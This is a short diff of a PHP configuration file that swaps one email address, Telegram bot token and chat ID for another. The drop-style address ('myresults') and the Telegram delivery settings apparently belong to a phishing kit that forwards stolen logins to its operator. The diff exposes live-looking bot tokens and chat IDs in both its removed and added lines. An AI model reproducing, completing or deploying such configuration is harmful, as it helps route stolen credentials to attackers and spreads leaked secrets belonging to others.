@@ -1,5 +1,6 @@
 <?
-$email = "myresults34@gmail.com";
-$botToken = "6195889014:AAEeq1CqxW68j5fA4cBUUUsjuLPs8qN4vGU";
-$chatId = "5723997278";
+$email = "support@cloudnovardp.sbs";
+$botToken = "7793230815:AAG_bvautl-oMP43izsQ5cFg87ZOFnjdDOk";
+$chatId = "7959372593";
+
 ?>
